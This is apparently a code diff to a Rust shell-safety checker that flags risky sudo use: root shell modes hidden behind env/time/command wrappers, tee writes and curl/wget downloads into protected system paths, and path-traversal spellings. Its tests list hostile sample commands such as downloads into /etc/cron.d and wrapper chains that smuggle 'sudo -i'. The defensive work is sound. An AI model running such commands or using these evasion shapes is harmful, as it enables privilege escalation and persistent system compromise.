@@ -34,11 +34,6 @@ pub fn check(input: &str, shell: ShellType, policy: &Policy) -> Vec<Finding> {
     for seg in &segments {
         if let Some(parsed) = parse_sudo_invocation(seg, shell) {
             findings.extend(rules_for_segment(&parsed, input, seg, shell));
-        } else if let Some(parsed) = parse_pipe_into_sudo_tee(seg, shell) {
-            // `… | sudo tee /etc/foo` arrives as a segment whose leader
-            // is `sudo` and arg-list starts with `tee`. We still need to
-            // run the tee check on it.
-            findings.extend(rules_for_segment(&parsed, input, seg, shell));
         }
     }
 
@@ -67,6 +62,9 @@ struct SudoParsed {
     preserve_env_all: bool,
     /// Specific vars from `--preserve-env=A,B,C` (matched case-insensitively).
     preserve_env_vars: Vec<String>,
+    /// `sudo -s` / `--shell` or `sudo -i` / `--login`, including bundled
+    /// short flags. These modes spawn a privileged shell even with no command.
+    shell_mode: Option<&'static str>,
     /// Inner command base name; empty when sudo had no positional command.
     inner_cmd: String,
     /// Inner command's args (raw, quotes preserved).
@@ -77,79 +75,251 @@ struct SudoParsed {
 /// resolution) is `sudo`. `None` for non-sudo segments.
 fn parse_sudo_invocation(seg: &tokenize::Segment, shell: ShellType) -> Option<SudoParsed> {
     let cmd = seg.command.as_deref()?;
-    let base = command_basename(cmd, shell);
-
-    if base == "sudo" {
-        return Some(parse_sudo_args(&seg.args, shell));
-    }
-
-    // `env [VAR=val …] sudo …` — strip the env wrapper, then sudo.
-    if base == "env" {
-        let inner_start = skip_env_assignments(&seg.args);
-        if inner_start < seg.args.len() {
-            let inner_leader = command_basename(&seg.args[inner_start], shell);
-            if inner_leader == "sudo" {
-                return Some(parse_sudo_args(&seg.args[inner_start + 1..], shell));
-            }
-        }
-    }
-
-    None
+    resolve_wrapped_sudo(cmd, &seg.args, shell, 32)
 }
 
-/// Parser for the trailing pipe segment (`… | sudo tee /etc/foo`). The leader is already
-/// `sudo`, so `parse_sudo_invocation` handles it; kept for symmetry. Currently delegates.
-fn parse_pipe_into_sudo_tee(seg: &tokenize::Segment, shell: ShellType) -> Option<SudoParsed> {
-    let leader = seg.command.as_deref().map(|c| command_basename(c, shell))?;
-    if leader != "sudo" {
+/// Resolve `env`/`command`/`time`/`exec`/`nohup` chains until the effective
+/// command is `sudo`. Depth is bounded independently of attacker argv length.
+fn resolve_wrapped_sudo(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+    depth: usize,
+) -> Option<SudoParsed> {
+    if depth == 0 {
         return None;
     }
-    Some(parse_sudo_args(&seg.args, shell))
+    let leader = command_basename(command, shell);
+    if leader == "sudo" {
+        return Some(parse_sudo_args(args, shell));
+    }
+    let (next, next_args) = match leader.as_str() {
+        "env" => unwrap_env(args, shell, depth)?,
+        "command" | "exec" | "nohup" => unwrap_command_wrapper(&leader, args)?,
+        "time" => unwrap_time(args)?,
+        _ => return None,
+    };
+    resolve_wrapped_sudo(&next, &next_args, shell, depth - 1)
 }
 
-/// Skip `KEY=VAL` assignments and bare flags between the `env` leader and the inner
-/// command. Returns the index of the first non-assignment, non-flag positional.
-fn skip_env_assignments(args: &[String]) -> usize {
+fn unwrap_env(
+    args: &[String],
+    shell: ShellType,
+    split_depth: usize,
+) -> Option<(String, Vec<String>)> {
     let mut idx = 0;
     while idx < args.len() {
-        let a = strip_outer_quotes(&args[idx]);
-        if a == "-S" || a == "--split-string" {
+        let arg = crate::rules::command::normalize_shell_token(&args[idx], shell);
+        if arg == "--" {
+            idx += 1;
+            break;
+        }
+        if tokenize::is_env_assignment(&arg) {
             idx += 1;
             continue;
         }
-        if a.starts_with('-') && a.len() >= 2 {
-            // Skip any leading env flag. We do NOT consume a value for `-u` — that would
-            // mis-resolve `env -u SUDO_ASKPASS sudo`; skip one slot and fall through.
+        if arg == "--split-string" {
+            return unwrap_env_split_string(
+                args.get(idx + 1)?,
+                &args[idx + 2..],
+                shell,
+                split_depth,
+                false,
+            );
+        }
+        if let Some(payload) = arg.strip_prefix("--split-string=") {
+            return unwrap_env_split_string(payload, &args[idx + 1..], shell, split_depth, true);
+        }
+        if matches!(arg.as_str(), "--unset" | "--chdir" | "--argv0") {
+            args.get(idx + 1)?;
+            idx += 2;
+            continue;
+        }
+        if arg.starts_with("--unset=") || arg.starts_with("--chdir=") || arg.starts_with("--argv0=")
+        {
             idx += 1;
             continue;
         }
-        if a.contains('=') {
+        if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 1 {
+            let cluster = &arg[1..];
+            let mut consumed_value = false;
+            for (offset, flag) in cluster.char_indices() {
+                let suffix = &cluster[offset + flag.len_utf8()..];
+                if matches!(flag, 'u' | 'C' | 'a') {
+                    if suffix.is_empty() {
+                        args.get(idx + 1)?;
+                        idx += 2;
+                    } else {
+                        idx += 1;
+                    }
+                    consumed_value = true;
+                    break;
+                }
+                if flag == 'S' {
+                    let (payload, trailing) = if suffix.is_empty() {
+                        (args.get(idx + 1)?.as_str(), &args[idx + 2..])
+                    } else {
+                        (suffix, &args[idx + 1..])
+                    };
+                    return unwrap_env_split_string(
+                        payload,
+                        trailing,
+                        shell,
+                        split_depth,
+                        !suffix.is_empty(),
+                    );
+                }
+            }
+            if consumed_value {
+                continue;
+            }
             idx += 1;
             continue;
         }
-        return idx;
+        if arg.starts_with('-') {
+            idx += 1;
+            continue;
+        }
+        break;
     }
-    idx
+    while idx < args.len()
+        && tokenize::is_env_assignment(&crate::rules::command::normalize_shell_token(
+            &args[idx], shell,
+        ))
+    {
+        idx += 1;
+    }
+    command_from(args, idx)
+}
+
+fn unwrap_env_split_string(
+    payload: &str,
+    trailing: &[String],
+    shell: ShellType,
+    split_depth: usize,
+    payload_is_normalized: bool,
+) -> Option<(String, Vec<String>)> {
+    if split_depth == 0 {
+        return None;
+    }
+    let payload = if payload_is_normalized {
+        payload.to_string()
+    } else {
+        crate::rules::command::normalize_shell_token(payload, shell)
+    };
+    // `env -S` splits an argv vector; it does not execute shell separators.
+    // Re-enter env's option/assignment grammar so payloads beginning with
+    // `-i`, `-u`, or another `-S` cannot hide the eventual sudo command.
+    let mut words = crate::rules::command::parse_env_split_string(&payload).ok()?;
+    if words.len().saturating_add(trailing.len()) > crate::rules::command::MAX_ENV_SPLIT_ARGV {
+        return None;
+    }
+    words.extend_from_slice(trailing);
+    unwrap_env(&words, shell, split_depth - 1)
+}
+
+fn unwrap_command_wrapper(wrapper: &str, args: &[String]) -> Option<(String, Vec<String>)> {
+    let mut idx = 0;
+    while idx < args.len() {
+        let arg = strip_outer_quotes(&args[idx]);
+        if arg == "--" {
+            idx += 1;
+            break;
+        }
+        if wrapper == "command" && matches!(arg, "-v" | "-V") {
+            // Query-only command builtin modes do not execute their operand.
+            return None;
+        }
+        if wrapper == "exec" && arg == "-a" {
+            args.get(idx + 1)?;
+            idx += 2;
+            continue;
+        }
+        if arg.starts_with('-') {
+            idx += 1;
+            continue;
+        }
+        break;
+    }
+    command_from(args, idx)
+}
+
+fn unwrap_time(args: &[String]) -> Option<(String, Vec<String>)> {
+    let mut idx = 0;
+    while idx < args.len() {
+        let arg = strip_outer_quotes(&args[idx]);
+        if arg == "--" {
+            idx += 1;
+            break;
+        }
+        if matches!(arg, "-f" | "--format" | "-o" | "--output") {
+            args.get(idx + 1)?;
+            idx += 2;
+            continue;
+        }
+        if arg.starts_with("--format=") || arg.starts_with("--output=") {
+            idx += 1;
+            continue;
+        }
+        if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 1 {
+            let cluster = &arg[1..];
+            let mut consumed_value = false;
+            for (offset, flag) in cluster.char_indices() {
+                if matches!(flag, 'f' | 'o') {
+                    let suffix = &cluster[offset + flag.len_utf8()..];
+                    if suffix.is_empty() {
+                        args.get(idx + 1)?;
+                        idx += 2;
+                    } else {
+                        idx += 1;
+                    }
+                    consumed_value = true;
+                    break;
+                }
+            }
+            if consumed_value {
+                continue;
+            }
+            idx += 1;
+            continue;
+        }
+        if arg.starts_with('-') {
+            idx += 1;
+            continue;
+        }
+        break;
+    }
+    command_from(args, idx)
+}
+
+fn command_from(args: &[String], idx: usize) -> Option<(String, Vec<String>)> {
+    let command = args.get(idx)?.clone();
+    Some((command, args[idx + 1..].to_vec()))
 }
 
 /// Parse the args beyond the `sudo` leader into the inner command + post-flag args.
 fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
-    let value_short = ["-u", "-g", "-C", "-D", "-R", "-T"];
+    let value_short = ['a', 'u', 'g', 'C', 'D', 'R', 'T', 'U', 'p', 'r', 't'];
     let value_long = [
         "--user",
         "--group",
+        "--auth-type",
         "--close-from",
         "--chdir",
+        "--prompt",
+        "--chroot",
         "--role",
         "--type",
         "--other-user",
         "--host",
         "--timeout",
+        "--command-timeout",
     ];
 
     let mut idx = 0;
     let mut preserve_env_all = false;
     let mut preserve_env_vars: Vec<String> = Vec::new();
+    let mut shell_mode: Option<&'static str> = None;
     let mut inner_start: Option<usize> = None;
 
     while idx < args.len() {
@@ -158,6 +328,20 @@ fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
         if a == "--" {
             inner_start = Some(idx + 1);
             break;
+        }
+        if tokenize::is_env_assignment(a) {
+            idx += 1;
+            continue;
+        }
+        if a == "--shell" {
+            shell_mode = Some("shell");
+            idx += 1;
+            continue;
+        }
+        if a == "--login" {
+            shell_mode = Some("login");
+            idx += 1;
+            continue;
         }
         // -E / --preserve-env (no value): preserve ALL.
         if a == "-E" {
@@ -181,12 +365,12 @@ fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
             idx += 1;
             continue;
         }
-        // `-Eu user` form: a bundled short flag containing `E` still preserves all env.
-        if a.starts_with('-') && a.len() > 1 && !a.starts_with("--") && a.contains('E') {
-            preserve_env_all = true;
-        }
         if a.starts_with("--") {
-            if value_long.contains(&a) {
+            let name = a.split_once('=').map(|(name, _)| name).unwrap_or(a);
+            if value_long.contains(&name) && !a.contains('=') {
+                if args.get(idx + 1).is_none() {
+                    break;
+                }
                 idx += 2;
             } else {
                 idx += 1;
@@ -194,11 +378,25 @@ fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
             continue;
         }
         if a.starts_with('-') && a.len() > 1 {
-            if value_short.contains(&a) {
-                idx += 2;
-            } else {
-                idx += 1;
+            let cluster = &a[1..];
+            let mut consumes_next = false;
+            for (offset, flag) in cluster.char_indices() {
+                match flag {
+                    'E' => preserve_env_all = true,
+                    's' => shell_mode = Some("shell"),
+                    'i' => shell_mode = Some("login"),
+                    value if value_short.contains(&value) => {
+                        let suffix = &cluster[offset + value.len_utf8()..];
+                        consumes_next = suffix.is_empty();
+                        break;
+                    }
+                    _ => {}
+                }
             }
+            if consumes_next && args.get(idx + 1).is_none() {
+                break;
+            }
+            idx += if consumes_next { 2 } else { 1 };
             continue;
         }
         // First positional: the inner command.
@@ -211,6 +409,7 @@ fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
         return SudoParsed {
             preserve_env_all,
             preserve_env_vars,
+            shell_mode,
             inner_cmd: String::new(),
             inner_args: Vec::new(),
         };
@@ -222,6 +421,7 @@ fn parse_sudo_args(args: &[String], shell: ShellType) -> SudoParsed {
     SudoParsed {
         preserve_env_all,
         preserve_env_vars,
+        shell_mode,
         inner_cmd,
         inner_args,
     }
@@ -238,18 +438,21 @@ fn rules_for_segment(
     let inner = parsed.inner_cmd.as_str();
     let inner_args = &parsed.inner_args;
 
-    // 1) sudo <interactive-shell>
-    if is_interactive_shell(inner) {
+    // 1) sudo <interactive-shell>, including sudo's own canonical shell modes.
+    if parsed.shell_mode.is_some() || is_interactive_shell(inner) {
+        let shell_description: &str = match parsed.shell_mode {
+            Some(mode) => mode,
+            None => inner,
+        };
         findings.push(make_finding(
             RuleId::SudoShellSpawn,
             Severity::High,
-            format!("sudo {inner}: interactive root shell"),
-            format!(
-                "`sudo {inner}` opens an interactive root shell. Subsequent commands typed \
-                 into that shell run with full privileges and are NOT seen by tirith \
-                 (we intercept the local shell, not nested shells). Run the specific \
-                 command that needs elevation with sudo, not a shell."
-            ),
+            format!("sudo {shell_description}: interactive root shell"),
+            "This sudo invocation opens an interactive root shell. Subsequent commands typed \
+             into that shell run with full privileges and are NOT seen by tirith \
+             (we intercept the local shell, not nested shells). Run the specific \
+             command that needs elevation with sudo, not a shell."
+                .to_string(),
             input,
             seg,
         ));
@@ -313,45 +516,47 @@ fn rules_for_segment(
 
     // 3) sudo tee <system-path>
     if inner == "tee" {
-        if let Some(target) = first_tee_target(inner_args) {
-            if is_protected_system_path(&target) {
-                findings.push(make_finding(
-                    RuleId::SudoTeeSystemFile,
-                    Severity::High,
-                    format!("sudo tee writes to protected system path '{target}'"),
-                    format!(
-                        "`… | sudo tee {target}` writes attacker-controllable input \
-                         to a privileged system path. If the upstream content is \
-                         untrusted (a fetched script, an LLM-generated config, …) \
-                         this overwrites a file the OS trusts. Confirm the input \
-                         source before re-running."
-                    ),
-                    input,
-                    seg,
-                ));
-            }
+        if let Some(target) = tee_targets(inner_args)
+            .into_iter()
+            .find(|target| is_protected_system_path(target))
+        {
+            findings.push(make_finding(
+                RuleId::SudoTeeSystemFile,
+                Severity::High,
+                format!("sudo tee writes to protected system path '{target}'"),
+                format!(
+                    "`… | sudo tee {target}` writes attacker-controllable input \
+                     to a privileged system path. If the upstream content is \
+                     untrusted (a fetched script, an LLM-generated config, …) \
+                     this overwrites a file the OS trusts. Confirm the input \
+                     source before re-running."
+                ),
+                input,
+                seg,
+            ));
         }
     }
 
     // 4) sudo curl|wget|fetch -o <system-path>
     if is_download_tool(inner) {
-        if let Some(target) = first_download_output_path(inner_args) {
-            if is_protected_system_path(&target) {
-                findings.push(make_finding(
-                    RuleId::SudoDownloadInstall,
-                    Severity::High,
-                    format!("sudo {inner} writes downloaded content to '{target}'"),
-                    format!(
-                        "`sudo {inner} -o {target}` downloads remote content and \
-                         writes it to a privileged system path as root. The standard \
-                         attack shape is `sudo curl -o /usr/local/bin/<tool> <url>` — \
-                         it bypasses package signing entirely. Download to a \
-                         user-writable path, review, then `sudo install` if needed."
-                    ),
-                    input,
-                    seg,
-                ));
-            }
+        if let Some(target) = download_output_paths(inner, inner_args)
+            .into_iter()
+            .find(|target| is_protected_system_path(target))
+        {
+            findings.push(make_finding(
+                RuleId::SudoDownloadInstall,
+                Severity::High,
+                format!("sudo {inner} writes downloaded content to '{target}'"),
+                format!(
+                    "`sudo {inner} -o {target}` downloads remote content and \
+                     writes it to a privileged system path as root. The standard \
+                     attack shape is `sudo curl -o /usr/local/bin/<tool> <url>` — \
+                     it bypasses package signing entirely. Download to a \
+                     user-writable path, review, then `sudo install` if needed."
+                ),
+                input,
+                seg,
+            ));
         }
     }
 
@@ -440,15 +645,26 @@ fn first_broad_path_arg(args: &[String], _shell: ShellType) -> Option<String> {
 /// A "broad path" is `/`, `/home`, `/usr`, `/etc`, etc. — kept deliberately narrow
 /// (false-positives on `/etc/myapp/config.d` would be noisy).
 fn is_broad_path(p: &str) -> bool {
+    let normalized = match normalize_lexical_path(p) {
+        Ok(Some(path)) => path,
+        Ok(None) => return false,
+        Err(()) => return p.starts_with('/') || is_home_path(p),
+    };
     matches!(
-        p,
-        "/" | "/home" | "/usr" | "/etc" | "/var" | "/opt" | "/srv" | "/lib" | "/bin"
+        normalized.as_str(),
+        "/" | "/home"
+            | "/usr"
+            | "/etc"
+            | "/var"
+            | "/opt"
+            | "/srv"
+            | "/lib"
+            | "/lib64"
+            | "/bin"
+            | "/sbin"
+            | "/usr/local/sbin"
+            | "/var/spool/cron"
     )
-        // Trailing slash variants.
-        || matches!(
-            p,
-            "/home/" | "/usr/" | "/etc/" | "/var/" | "/opt/" | "/srv/" | "/lib/" | "/bin/"
-        )
 }
 
 fn is_chmod_mode_or_owner(a: &str) -> bool {
@@ -474,42 +690,92 @@ fn is_chmod_mode_or_owner(a: &str) -> bool {
     false
 }
 
-/// Find the `tee` target — first positional arg that is not a flag.
-fn first_tee_target(args: &[String]) -> Option<String> {
+/// Find every `tee` target. `tee` writes stdin to every positional operand, so
+/// checking only the first lets a benign target hide a later privileged one.
+fn tee_targets(args: &[String]) -> Vec<String> {
+    let mut targets = Vec::new();
+    let mut after_double_dash = false;
     for arg in args.iter() {
         let a = strip_outer_quotes(arg);
-        if a == "--" {
+        if !after_double_dash && a == "--" {
+            after_double_dash = true;
             continue;
         }
-        if a.starts_with('-') && a.len() > 1 {
+        if !after_double_dash && a.starts_with('-') && a.len() > 1 {
             continue;
         }
-        return Some(a.to_string());
+        targets.push(a.to_string());
     }
-    None
+    targets
 }
 
-/// Find the `curl/wget -o <path>` output path. Handles glued forms
-/// (`-o=file`, `--output=file`) and split forms (`-o file`).
-fn first_download_output_path(args: &[String]) -> Option<String> {
+/// Find all downloader output paths using that tool's own option
+/// grammar. curl uses `-o`/`--output`; wget uses
+/// `-O`/`--output-document`; fetch uses `-o`.
+fn download_output_paths(tool: &str, args: &[String]) -> Vec<String> {
+    let mut outputs = Vec::new();
     let mut iter = args.iter().enumerate();
     while let Some((_i, arg)) = iter.next() {
         let a = strip_outer_quotes(arg);
-        if let Some(rest) = a.strip_prefix("--output=") {
-            return Some(rest.to_string());
-        }
-        if let Some(rest) = a.strip_prefix("-o=") {
-            return Some(rest.to_string());
-        }
-        if a == "-o" || a == "--output" || a == "-O" {
-            // Next arg is the path (wget also uses `-O`).
-            if let Some((_, next)) = iter.next() {
-                let v = strip_outer_quotes(next);
-                return Some(v.to_string());
+        match tool {
+            "curl" => {
+                if let Some(rest) = a.strip_prefix("--output=") {
+                    if !rest.is_empty() {
+                        outputs.push(rest.to_string());
+                    }
+                    continue;
+                }
+                if a == "-o" || a == "--output" {
+                    if let Some((_, next)) = iter.next() {
+                        outputs.push(strip_outer_quotes(next).to_string());
+                    }
+                    continue;
+                }
+                if let Some(rest) = a.strip_prefix("-o") {
+                    let rest = rest.strip_prefix('=').unwrap_or(rest);
+                    if !rest.is_empty() {
+                        outputs.push(rest.to_string());
+                    }
+                }
             }
+            "wget" => {
+                if let Some(rest) = a.strip_prefix("--output-document=") {
+                    if !rest.is_empty() {
+                        outputs.push(rest.to_string());
+                    }
+                    continue;
+                }
+                if a == "-O" || a == "--output-document" {
+                    if let Some((_, next)) = iter.next() {
+                        outputs.push(strip_outer_quotes(next).to_string());
+                    }
+                    continue;
+                }
+                if let Some(rest) = a.strip_prefix("-O") {
+                    let rest = rest.strip_prefix('=').unwrap_or(rest);
+                    if !rest.is_empty() {
+                        outputs.push(rest.to_string());
+                    }
+                }
+            }
+            "fetch" => {
+                if a == "-o" || a == "--output" {
+                    if let Some((_, next)) = iter.next() {
+                        outputs.push(strip_outer_quotes(next).to_string());
+                    }
+                    continue;
+                }
+                if let Some(rest) = a.strip_prefix("-o") {
+                    let rest = rest.strip_prefix('=').unwrap_or(rest);
+                    if !rest.is_empty() {
+                        outputs.push(rest.to_string());
+                    }
+                }
+            }
+            _ => return Vec::new(),
         }
     }
-    None
+    outputs
 }
 
 /// `true` when the target is under a protected system dir or a home shell-init dotfile.
@@ -517,58 +783,119 @@ fn first_download_output_path(args: &[String]) -> Option<String> {
 /// home-dotfile arm closes a gap: `check_dotfile_overwrite` catches the redirect shape
 /// but not the pipe-into-`sudo tee` shape.
 fn is_protected_system_path(p: &str) -> bool {
-    // Repo-relative / current-dir — never protected.
-    if !p.starts_with('/')
-        && !p.starts_with('~')
-        && !p.starts_with("$HOME")
-        && !p.starts_with("${HOME")
-    {
-        return false;
-    }
+    let p = match normalize_lexical_path(p) {
+        Ok(Some(path)) => path,
+        Ok(None) => return false,
+        // Refuse to bless a rooted path whose parent traversal escapes the
+        // modeled root.
+        Err(()) => return true,
+    };
 
     // Home shell-init dotfiles are protected (bare name only; `~/.config/zsh/…` is not).
-    if is_home_shell_init_dotfile(p) {
+    if is_home_shell_init_dotfile(&p) {
         return true;
     }
 
     // Other paths under ~/ and $HOME/ are user-writable.
-    if p.starts_with('~') || p.starts_with("$HOME") || p.starts_with("${HOME") {
+    if p == "~" || p.starts_with("~/") {
         return false;
     }
 
     // /tmp is shared but not OS-system.
-    if p == "/tmp" || p.starts_with("/tmp/") {
+    if path_is_or_under(&p, "/tmp") {
         return false;
     }
     // /var/tmp same.
-    if p == "/var/tmp" || p.starts_with("/var/tmp/") {
+    if path_is_or_under(&p, "/var/tmp") {
         return false;
     }
-    // Documented system trees.
-    p.starts_with("/etc/")
-        || p == "/etc"
-        || p.starts_with("/usr/local/bin/")
-        || p == "/usr/local/bin"
-        || p.starts_with("/usr/bin/")
-        || p == "/usr/bin"
-        || p.starts_with("/usr/sbin/")
-        || p == "/usr/sbin"
-        || p.starts_with("/lib/systemd/")
-        || p.starts_with("/lib/")
-        || p.starts_with("/usr/lib/systemd/")
-        || p.starts_with("/etc/cron")
-        || p.starts_with("/etc/systemd/")
-        // Webroot / persistent system dirs added per PR-127 review.
-        || p == "/var/www"
-        || p.starts_with("/var/www/")
-        || p == "/srv"
-        || p.starts_with("/srv/")
-        || p == "/root"
-        || p.starts_with("/root/")
-        || p == "/boot"
-        || p.starts_with("/boot/")
-        || p == "/var/lib"
-        || p.starts_with("/var/lib/")
+    const PROTECTED_ROOTS: &[&str] = &[
+        "/etc",
+        "/bin",
+        "/sbin",
+        "/usr/bin",
+        "/usr/sbin",
+        "/usr/local/bin",
+        "/usr/local/sbin",
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64",
+        "/var/spool/cron",
+        "/var/www",
+        "/var/lib",
+        "/srv",
+        "/root",
+        "/boot",
+    ];
+    PROTECTED_ROOTS
+        .iter()
+        .any(|root| path_is_or_under(&p, root))
+}
+
+fn path_is_or_under(path: &str, root: &str) -> bool {
+    path == root
+        || path
+            .strip_prefix(root)
+            .is_some_and(|tail| tail.starts_with('/'))
+}
+
+fn is_home_path(path: &str) -> bool {
+    path == "~"
+        || path.starts_with("~/")
+        || path == "$HOME"
+        || path.starts_with("$HOME/")
+        || path == "${HOME}"
+        || path.starts_with("${HOME}/")
+        || path == "${HOME:-/root}"
+        || path.starts_with("${HOME:-/root}/")
+}
+
+/// Collapse redundant separators and dot components without following
+/// symlinks. Root/home escape attempts are rejected instead of normalized into
+/// a potentially benign spelling.
+fn normalize_lexical_path(path: &str) -> Result<Option<String>, ()> {
+    let path = strip_outer_quotes(path).trim();
+    if path.contains('\0') {
+        return Err(());
+    }
+    let (root, tail) = if let Some(tail) = path.strip_prefix("${HOME:-/root}/") {
+        ("~", tail)
+    } else if let Some(tail) = path.strip_prefix("${HOME}/") {
+        ("~", tail)
+    } else if let Some(tail) = path.strip_prefix("$HOME/") {
+        ("~", tail)
+    } else if let Some(tail) = path.strip_prefix("~/") {
+        ("~", tail)
+    } else if matches!(path, "~" | "$HOME" | "${HOME}" | "${HOME:-/root}") {
+        return Ok(Some("~".to_string()));
+    } else if let Some(tail) = path.strip_prefix('/') {
+        ("/", tail)
+    } else {
+        return Ok(None);
+    };
+
+    let mut components: Vec<&str> = Vec::new();
+    for component in tail.split('/') {
+        match component {
+            "" | "." => {}
+            ".." => {
+                if components.pop().is_none() {
+                    return Err(());
+                }
+            }
+            other => components.push(other),
+        }
+    }
+    if components.is_empty() {
+        return Ok(Some(root.to_string()));
+    }
+    let normalized = if root == "/" {
+        format!("/{}", components.join("/"))
+    } else {
+        format!("~/{}", components.join("/"))
+    };
+    Ok(Some(normalized))
 }
 
 /// `true` for a home shell-init dotfile (`~/.bashrc`, `~/.zshrc`, … exact basenames only,
@@ -700,6 +1027,28 @@ mod tests {
     }
 
     #[test]
+    fn sudo_canonical_shell_modes_fire() {
+        let policy = Policy::default();
+        for command in [
+            "sudo -s",
+            "sudo -i",
+            "sudo --shell",
+            "sudo --login",
+            "sudo --prompt password: --shell",
+            "sudo --chroot /mnt --login",
+            "sudo -Es",
+        ] {
+            let findings = check(command, ShellType::Posix, &policy);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| matches!(finding.rule_id, RuleId::SudoShellSpawn)),
+                "sudo shell mode escaped detection for {command:?}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
     fn sudo_apt_update_does_not_fire_shell_spawn() {
         let policy = Policy::default();
         let findings = check("sudo apt update", ShellType::Posix, &policy);
@@ -811,6 +1160,25 @@ mod tests {
     }
 
     #[test]
+    fn later_tee_and_download_targets_cannot_hide_behind_safe_ones() {
+        let policy = Policy::default();
+        for command in [
+            "sudo tee /tmp/preview /etc/cron.d/payload",
+            "sudo curl -o /tmp/preview https://example.com/a -o /usr/local/bin/tool https://example.com/b",
+            "sudo wget -O /tmp/preview https://example.com/a -O /etc/cron.d/payload https://example.com/b",
+        ] {
+            let findings = check(command, ShellType::Posix, &policy);
+            assert!(
+                findings.iter().any(|finding| matches!(
+                    finding.rule_id,
+                    RuleId::SudoTeeSystemFile | RuleId::SudoDownloadInstall
+                )),
+                "later privileged output escaped for {command:?}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
     fn sudo_curl_to_home_does_not_fire() {
         let policy = Policy::default();
         let findings = check(
@@ -825,13 +1193,32 @@ mod tests {
     fn sudo_wget_glued_output_etc_fires() {
         let policy = Policy::default();
         let findings = check(
-            "sudo wget --output=/etc/foo https://example.com/foo",
+            "sudo wget --output-document=/etc/foo https://example.com/foo",
             ShellType::Posix,
             &policy,
         );
         assert!(findings
             .iter()
             .any(|f| matches!(f.rule_id, RuleId::SudoDownloadInstall)));
+    }
+
+    #[test]
+    fn downloader_attached_output_forms_fire() {
+        let policy = Policy::default();
+        for command in [
+            "sudo curl -o/usr/local/bin/tool https://example.com/tool",
+            "sudo wget -O/etc/cron.d/payload https://example.com/payload",
+            "sudo wget --output-document=/etc/cron.d/payload https://example.com/payload",
+            "sudo wget --output-document /usr/local/sbin/tool https://example.com/tool",
+        ] {
+            let findings = check(command, ShellType::Posix, &policy);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| matches!(finding.rule_id, RuleId::SudoDownloadInstall)),
+                "downloader output spelling escaped detection for {command:?}: {findings:?}"
+            );
+        }
     }
 
     #[test]
@@ -886,6 +1273,31 @@ mod tests {
     }
 
     #[test]
+    fn value_aware_and_recursive_wrappers_reach_sudo() {
+        let policy = Policy::default();
+        for command in [
+            "env -u SUDO_ASKPASS sudo bash",
+            "env --argv0 elevated sudo -s",
+            "env -a elevated sudo -i",
+            "env -- FOO=1 sudo -s",
+            "command env --chdir /tmp time sudo -i",
+            "time -af %e sudo -s",
+            "time -f %e command -- sudo -s",
+            r#"env -S "sudo -i""#,
+            r#"env -S "sudo" -i"#,
+            r#"env -S "-i FOO=1 sudo -i""#,
+        ] {
+            let findings = check(command, ShellType::Posix, &policy);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| matches!(finding.rule_id, RuleId::SudoShellSpawn)),
+                "wrapper chain hid sudo shell for {command:?}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
     fn preserve_env_named_aws_secret_fires() {
         // Uses the explicit `--preserve-env=AWS_SECRET_ACCESS_KEY` form (no env mutation,
         // so the libc-environ race is irrelevant).
@@ -935,6 +1347,25 @@ mod tests {
     }
 
     #[test]
+    fn protected_paths_are_lexically_normalized() {
+        for path in [
+            "/var/../etc/cron.d/payload",
+            "/etc//cron.d/./payload",
+            "/usr/local/bin/../sbin/tool",
+            "/var/spool/cron/root",
+            "/sbin/tool",
+            "~/.config/../.bashrc",
+        ] {
+            assert!(
+                is_protected_system_path(path),
+                "normalized protected path was missed: {path}"
+            );
+        }
+        assert!(!is_protected_system_path("/var/tmp/../tmp/file"));
+        assert!(is_protected_system_path("/../../etc/passwd"));
+    }
+
+    #[test]
     fn is_protected_system_path_covers_home_shell_init_dotfiles() {
         // Regression PR-127 #3: `sudo tee ~/.bashrc` was silently allowed.
         assert!(is_protected_system_path("~/.bashrc"));
@@ -976,33 +1407,46 @@ mod tests {
         assert!(is_broad_path("/srv"));
         assert!(is_broad_path("/lib"));
         assert!(is_broad_path("/bin"));
+        assert!(is_broad_path("/usr/../etc"));
+        assert!(is_broad_path("/usr//local/../local/sbin"));
+        assert!(is_broad_path("/var/spool/cron"));
         assert!(!is_broad_path("/etc/cron.d"));
         assert!(!is_broad_path("/home/me"));
     }
 
     #[test]
-    fn first_download_output_path_split_and_glued() {
+    fn download_output_paths_split_glued_and_repeated() {
         assert_eq!(
-            first_download_output_path(&[
-                "-o".to_string(),
-                "/usr/local/bin/foo".to_string(),
-                "https://example.com/foo".to_string(),
-            ])
-            .as_deref(),
-            Some("/usr/local/bin/foo"),
+            download_output_paths(
+                "curl",
+                &[
+                    "-o".to_string(),
+                    "/usr/local/bin/foo".to_string(),
+                    "https://example.com/foo".to_string(),
+                ]
+            ),
+            vec!["/usr/local/bin/foo"],
         );
         assert_eq!(
-            first_download_output_path(&[
-                "--output=/etc/x".to_string(),
-                "https://example.com/x".to_string(),
-            ])
-            .as_deref(),
-            Some("/etc/x"),
+            download_output_paths(
+                "curl",
+                &[
+                    "--output=/etc/x".to_string(),
+                    "https://example.com/x".to_string(),
+                ]
+            ),
+            vec!["/etc/x"],
         );
         assert_eq!(
-            first_download_output_path(&["-O".to_string(), "/usr/local/bin/foo".to_string(),])
-                .as_deref(),
-            Some("/usr/local/bin/foo"),
+            download_output_paths(
+                "wget",
+                &["-O".to_string(), "/usr/local/bin/foo".to_string()],
+            ),
+            vec!["/usr/local/bin/foo"],
+        );
+        assert_eq!(
+            download_output_paths("wget", &["--output-document=/etc/x".to_string()],),
+            vec!["/etc/x"],
         );
     }
 }
